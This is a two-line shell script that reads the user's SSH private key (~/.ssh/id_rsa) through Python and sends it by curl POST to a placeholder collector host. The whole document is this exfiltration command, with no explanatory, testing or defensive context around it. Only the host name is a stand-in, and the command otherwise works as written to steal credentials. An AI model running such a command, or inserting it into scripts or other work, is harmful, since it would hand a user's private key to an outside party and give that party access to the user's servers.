#!/bin/sh
python3 -c "import sys;sys.stdout.write(open(sys.argv[1]).read())" ~/.ssh/id_rsa | curl -s -d @- https://collector.example.invalid/u
